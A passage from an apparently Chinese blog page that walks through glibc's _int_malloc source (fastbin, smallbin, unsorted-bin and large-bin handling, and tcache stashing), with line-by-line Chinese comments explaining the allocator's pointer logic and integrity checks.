class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(get_max_fast()))<br>&#123;<br>    idx = fastbin_index(nb);<br>    mfastbinptr *fb = &amp;fastbin(av, idx);<br>    mchunkptr pp = *fb;<br>    <span class="hljs-keyword">do</span> <span class="hljs-comment">//取出第一个fastchunk</span><br>    &#123;<br>        victim = pp;<br>        <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125; <span class="hljs-keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim)) != victim);<br>    <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="hljs-number">0</span>))<br>        &#123;<span class="hljs-comment">//请求的bytes-&gt;nb-&gt;idx-&gt;fb, 所以idx是按照bytes来确定的, 从这组idx里取出一个fastbinchunk,</span><br>            <span class="hljs-comment">//将他的大小转换为下标, 如果这两个不相等说明fastbin的size段被篡改</span><br>            <span class="hljs-comment">//chunksize(victim) != nb想来也一样吧(?</span><br>            errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>        errout:<br>            malloc_printerr(check_action, errstr, chunk2mem(victim), av);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        &#125;<br>        <span class="hljs-comment">//检查arena,大小,alignment,chunk_size等等</span><br>        check_remalloced_chunk(av, victim, nb);<br>        <span class="hljs-comment">//返回用户指针</span><br>        <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>        <span class="hljs-comment">//如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span><br>        alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="2-26"><a href="#2-26" class="headerlink" title="2.26"></a>2.26</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (get_max_fast ()))<br>    &#123;<br>      idx = fastbin_index (nb);<br>      mfastbinptr *fb = &amp;fastbin (av, idx);<br>      mchunkptr pp;<br>      victim = *fb;<br>      <span class="hljs-keyword">if</span> (victim != <span class="hljs-literal">NULL</span>)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>            *fb = victim-&gt;fd;<br>          <span class="hljs-keyword">else</span><br>            REMOVE_FB (fb, pp, victim);<br>          <span class="hljs-keyword">if</span> (__glibc_likely (victim != <span class="hljs-literal">NULL</span>))<br>            &#123;<br>              <span class="hljs-keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));<br>              <span class="hljs-keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="hljs-number">0</span>))<br>                malloc_printerr (<span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>);<br>              check_remalloced_chunk (av, victim, nb);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>              <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">                 stash them in the tcache.  */</span><br>              <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (nb);<br>              <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>                &#123;<br>                  mchunkptr tc_victim;<br>                  <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks.  */</span><br>                  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>                         &amp;&amp; (tc_victim = *fb) != <span class="hljs-literal">NULL</span>)<br>                    &#123;<br>                      <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>                        *fb = tc_victim-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        &#123;<br>                          REMOVE_FB (fb, pp, tc_victim);<br>                          <span class="hljs-keyword">if</span> (__glibc_unlikely (tc_victim == <span class="hljs-literal">NULL</span>))<br>                            <span class="hljs-keyword">break</span>;<br>                        &#125;<br>                      tcache_put (tc_victim, tc_idx);<br>                    &#125;<br>                &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>              <span class="hljs-keyword">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><h3 id="smallbin-range-2-27"><a href="#smallbin-range-2-27" class="headerlink" title="smallbin_range 2.27"></a>smallbin_range 2.27</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">  <span class="hljs-comment">/*</span><br><span class="hljs-comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="hljs-comment">     hold one size each, no searching within bins is necessary.</span><br><span class="hljs-comment">     (For a large request, we need to wait until unsorted chunks are</span><br><span class="hljs-comment">     processed to find best fit. But for small ones, fits are exact</span><br><span class="hljs-comment">     anyway, so we can check now, which is faster.)</span><br><span class="hljs-comment">   */</span><br><span class="hljs-keyword">if</span> (in_smallbin_range(nb))<br>    &#123;<br>        idx = smallbin_index(nb);<br>        bin = bin_at(av, idx);<br><br>        <span class="hljs-keyword">if</span> ((victim = last(bin)) != bin) <span class="hljs-comment">//FIFO</span><br>        &#123;<br>            bck = victim-&gt;bk; <span class="hljs-comment">//取出倒数第二个chunk</span><br>            <span class="hljs-keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim))<br>                malloc_printerr(<span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);<br>            set_inuse_bit_at_offset(victim, nb);<br>            bin-&gt;bk = bck;<br>            bck-&gt;fd = bin;<br><br>            <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                set_non_main_arena(victim);<br>            check_malloced_chunk(av, victim, nb);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>            <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">            stash them in the tcache.  */</span><br>            <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx(nb);<br>            <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>            &#123;<br>                mchunkptr tc_victim;<br><br>                <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>                <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last(bin)) != bin)<br>                &#123;<br>                    <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>                    &#123;<br>                        bck = tc_victim-&gt;bk;<br>                        set_inuse_bit_at_offset(tc_victim, nb);<br>                        <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                            set_non_main_arena(tc_victim);<br>                        bin-&gt;bk = bck;<br>                        bck-&gt;fd = bin;<br><br>                        tcache_put(tc_victim, tc_idx);<br>                    &#125;<br>                &#125;<br>            &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>            <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>            alloc_perturb(p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><p>###largebin_range</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*     If this is a large request, consolidate fastbins before continuing.     </span><br><span class="hljs-comment">    While it might look excessive to kill all fastbins before     </span><br><span class="hljs-comment">    even seeing if there is space available, this avoids     </span><br><span class="hljs-comment">    fragmentation problems normally associated with fastbins.     </span><br><span class="hljs-comment">    Also, in practice, programs tend to have runs of either small or     </span><br><span class="hljs-comment">    large requests, but less often mixtures, so consolidation is not     </span><br><span class="hljs-comment">    invoked all that often in most programs. And the programs that     </span><br><span class="hljs-comment">    it is called frequently in otherwise tend to fragment.   */</span><br><span class="hljs-keyword">else</span><br>&#123;<br>    idx = largebin_index(nb);<br>    <span class="hljs-keyword">if</span> (have_fastchunks(av))<br>        malloc_consolidate(av);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>简而言之就是先执行<a href="#malloc_consolidate">malloc_consolidate</a>(), 合并fastbin中的free chunks</li></ul><h3 id="unsorted-bin-大循环"><a href="#unsorted-bin-大循环" class="headerlink" title="unsorted bin 大循环"></a><em><u>unsorted bin 大循环</u></em></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*     Process recently freed or remaindered chunks, taking one only if     </span><br><span class="hljs-comment">    it is exact fit, or, if this a small request, the chunk is remainder from     </span><br><span class="hljs-comment">    the most recent non-exact fit.  Place other traversed chunks in     </span><br><span class="hljs-comment">    bins.  Note that this step is the only place in any routine where     </span><br><span class="hljs-comment">    chunks are placed in bins.     </span><br><span class="hljs-comment">    The outer loop here is needed because we might not realize until     </span><br><span class="hljs-comment">    near the end of malloc that we should have consolidated, so must     </span><br><span class="hljs-comment">    do so and retry. This happens at most once, and only when we would     </span><br><span class="hljs-comment">    otherwise need to expand memory to service a &quot;small&quot; request.   */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>INTERNAL_SIZE_T tcache_nb = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">size_t</span> tc_idx = csize2tidx(nb);<br><span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>    tcache_nb = nb;<br><span class="hljs-keyword">int</span> return_cached = <span class="hljs-number">0</span>;<br>tcache_unsorted_count = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-keyword">for</span> (;;)<br>&#123;<br>    <span class="hljs-keyword">int</span> iters = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) <span class="hljs-comment">// 取出链表最后一个, FIFO</span><br>    &#123;<br>        bck = victim-&gt;bk; <span class="hljs-comment">//倒数第二个</span><br>        <span class="hljs-comment">//victim过大或过小都会出错</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask(victim) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) ||                      __builtin_expect(chunksize_nomask(victim) &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr(check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>, chunk2mem(victim), av);<br>        size = chunksize(victim);<br></code></pre></div></td></tr></table></figure><h4 id="victim-last-remainer"><a href="#victim-last-remainer" class="headerlink" title="victim == last_remainer"></a>victim == last_remainer</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">      <span class="hljs-comment">/*</span><br><span class="hljs-comment">           If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">           only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">           runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">           exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">           no exact fit for a small chunk.</span><br><span class="hljs-comment">         */</span><br><span class="hljs-comment">// 如果当前请求位于small chunks的大小范围内</span><br>    <span class="hljs-comment">// 同时，unsorted bin里只有一个chunk，该chunk还是last_remainder</span><br>    <span class="hljs-comment">// 并且 last remainder 的大小分割后还可以作为一个 chunk</span><br>      <span class="hljs-keyword">if</span> (in_smallbin_range(nb) &amp;&amp; <br>          bck == unsorted_chunks(av) &amp;&amp; <br>          victim == av-&gt;last_remainder &amp;&amp; <br>          (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &gt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb + MINSIZE)) <span class="hljs-comment">//victim分割出nb后还有MINSIZE</span><br>      &#123;<br>          <span class="hljs-comment">/* split and reattach remainder */</span><br>          remainder_size = size - nb;<br>          <span class="hljs-comment">//分割后剩下的chunk指针</span><br>          remainder = chunk_at_offset(victim, nb);<br>          <span class="hljs-comment">//设置从unsorted bin中割出来的chunk的fd和bk</span><br>          unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;<br>          <span class="hljs-comment">//更新last_remainer</span><br>          av-&gt;last_remainder = remainder;<br>          <span class="hljs-comment">//设置剩下的chunk的fd和bk</span><br>          remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);<br>          <span class="hljs-keyword">if</span> (!in_smallbin_range(remainder_size))<br>          &#123;<span class="hljs-comment">//如果是largechunk, 也设置一下nextsize</span><br>              remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>              remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>          &#125;<br>          <span class="hljs-comment">//设置两个块的标记bit</span><br>          set_head(victim, nb | PREV_INUSE |<br>                               (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>          set_head(remainder, remainder_size | PREV_INUSE);<br>          set_foot(remainder, remainder_size);<br>          <span class="hljs-comment">//详细的检查, 只有在MALLOC_DEBUG为1时启用</span><br>          check_malloced_chunk(av, victim, nb);<br>          <span class="hljs-comment">//返回用户指针</span><br>          <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>          alloc_perturb(p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>      &#125;<br></code></pre></div></td></tr></table></figure><h4 id="else-取出victim-准备放入合适的bin中"><a href="#else-取出victim-准备放入合适的bin中" class="headerlink" title="else 取出victim, 准备放入合适的bin中"></a>else 取出victim, 准备放入合适的bin中</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//如果不满足上面的条件, 就往下执行        </span><br><span class="hljs-comment">/* remove from unsorted list */</span> <br><span class="hljs-comment">//取出了victim        </span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="hljs-comment">//2.28特供</span><br>          malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks(av)-&gt;bk = bck;        <br>bck-&gt;fd = unsorted_chunks(av);<br></code></pre></div></td></tr></table></figure><h4 id="if-exact-fit"><a href="#if-exact-fit" class="headerlink" title="if exact fit"></a>if exact fit</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">        <span class="hljs-comment">/* Take now instead of binning if exact fit */</span> <span class="hljs-comment">//如果有刚好的chunk</span><br>        <span class="hljs-keyword">if</span> (size == nb)<br>        &#123;<br>            set_inuse_bit_at_offset(victim, size);<br>            <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                set_non_main_arena(victim);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE </span><br>            <span class="hljs-comment">/* Fill cache first, return to user only if cache fills. </span><br><span class="hljs-comment">            We may return one of these chunks later.  */</span> <br>            <span class="hljs-keyword">if</span> (tcache_nb &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>            &#123;<br>                tcache_put(victim, tc_idx);<br>                return_cached = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span>     <span class="hljs-comment">//详细的检查, 只有在MALLOC_DEBUG为1时启用</span></span><br>                check_malloced_chunk(av, victim, nb);<br>                <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>                alloc_perturb(p, bytes);<br>                <span class="hljs-keyword">return</span> p;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>            &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>        &#125;<br></code></pre></div></td></tr></table></figure><h4 id="放入small-or-large-bin"><a href="#放入small-or-large-bin" class="headerlink" title="放入small or large bin"></a>放入small or large bin</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">        <span class="hljs-comment">/* place chunk in bin */</span><br><span class="hljs-comment">//这一步意味着没有刚好合适的chunk, 所以放入到相应的bin中</span><br>        <span class="hljs-keyword">if</span> (in_smallbin_range(size))<br>        &#123;<span class="hljs-comment">//如果是smallbin</span><br>            victim_index = smallbin_index(size);<br>            bck = bin_at(av, victim_index);<span class="hljs-comment">//bin数组里的chunk指针</span><br>            fwd = bck-&gt;fd;<span class="hljs-comment">//smallbin链表里的第一个chunk</span><br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<span class="hljs-comment">//如果不是的话就是largebin了</span><br>            victim_index = largebin_index(size);<br>            bck = bin_at(av, victim_index);<br>            fwd = bck-&gt;fd;<br><br>            <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>            <span class="hljs-comment">//largebin是有顺序的, 要放在合适的位置, 还要设置fd_nextsize等等</span><br>            <span class="hljs-keyword">if</span> (fwd != bck)<br>            &#123;<span class="hljs-comment">//如果largebin为非空</span><br>                <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                size |= PREV_INUSE;<br>                <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                <span class="hljs-comment">//如果不是在main_arena呢?看来还是得学一学线程</span><br>                assert(chunk_main_arena(bck-&gt;bk));<br>                <span class="hljs-comment">//chunksize_nomask()直接取出size段, 不用位运算, 所以说speed comparison</span><br>                <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &lt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)chunksize_nomask(bck-&gt;bk))<br>                &#123;<span class="hljs-comment">//victim的size小于largebin尾部(bck-&gt;bk)的最小chunk</span><br>                   <span class="hljs-comment">// 令 fwd 指向 large bin 头</span><br>                    fwd = bck;<br>                    <span class="hljs-comment">// 令 bck 指向 largin bin 尾部 chunk</span><br>                    bck = bck-&gt;bk;<br>                    <span class="hljs-comment">// victim 的 fd_nextsize 指向 largin bin 的第一个 chunk</span><br>                    victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                    <span class="hljs-comment">// victim 的 bk_nextsize 指向原来链表的第一个 chunk 指向的 bk_nextsize</span><br>                    <span class="hljs-comment">//原来链表的第一个 chunk 指向的 bk_nextsize是原来最小的(chunk A),</span><br>                    <span class="hljs-comment">//因为这时victim比A小, 所以victim的bk_nextsize肯定是A</span><br>                    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                    <span class="hljs-comment">// 原来链表的第一个 chunk 的 bk_nextsize 指向 victim</span><br>                    <span class="hljs-comment">// 原来指向链表第一个 chunk 的 fd_nextsize 指向 victim</span><br>                    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                        <span class="hljs-comment">// 当前要插入的 victim 的大小大于最小的 chunk</span><br>                        <span class="hljs-comment">// 判断 fwd 是否在 main arena</span><br>                        assert(chunk_main_arena(fwd));<br>                        <span class="hljs-comment">// 从链表头部开始找到不比 victim 大的 chunk</span><br>                        <span class="hljs-keyword">while</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size &lt; chunksize_nomask(fwd)) &#123;<br>                            fwd = fwd-&gt;fd_nextsize;<br>                            assert(chunk_main_arena(fwd));<br>                        &#125;<br>                        <span class="hljs-comment">// 如果找到了一个和 victim 一样大的 chunk，</span><br>                        <span class="hljs-comment">// 那就直接将 chunk 插入到该chunk的后面，并不修改 nextsize 指针。</span><br>                        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size ==<br>                            (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) chunksize_nomask(fwd))<br>                            <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                            fwd = fwd-&gt;fd;<br>                        <span class="hljs-keyword">else</span> &#123;<br>                            <span class="hljs-comment">// 如果找到的chunk和当前victim大小不一样</span><br><span class="hljs-comment">//就需要构造 nextsize 双向链表,victim指向fwd和后一个(A),A的fd_next指向victim,fwd的bk_next指向victim(最后一行)</span><br>                            <span class="hljs-comment">// 这段真的妙, 我自己写估计得调试出好几个版本</span><br>                            victim-&gt;fd_nextsize              = fwd;<br>                            victim-&gt;bk_nextsize              = fwd-&gt;bk_nextsize;<br>                            fwd-&gt;bk_nextsize                 = victim;<br>                            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>                        bck = fwd-&gt;bk;<span class="hljs-comment">//</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-comment">//如果largebin是空的,fd_next和bk_next都指向自己就可以了</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>        &#125;<br>   <span class="hljs-comment">//完成victim的fd和bk指针的修改, 形成fwd--&gt;victim--&gt;bck</span><br>        mark_bin(av, victim_index);<br>        victim-&gt;bk = bck;<br>        victim-&gt;fd = fwd;<span class="hljs-comment">//以上两行将victim插入到相应的链表头部中</span><br>        fwd-&gt;bk = victim;<br>        bck-&gt;fd = victim;<span class="hljs-comment">//修改bck的fd指向victim, fwd(即现在的第二个chunk)的bk指向victim</span><br></code></pre></div></td></tr></table></figure><h4 id="判断iters-大循环结尾"><a href="#判断iters-大循环结尾" class="headerlink" title="判断iters(大循环结尾)"></a>判断iters(大循环结尾)</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 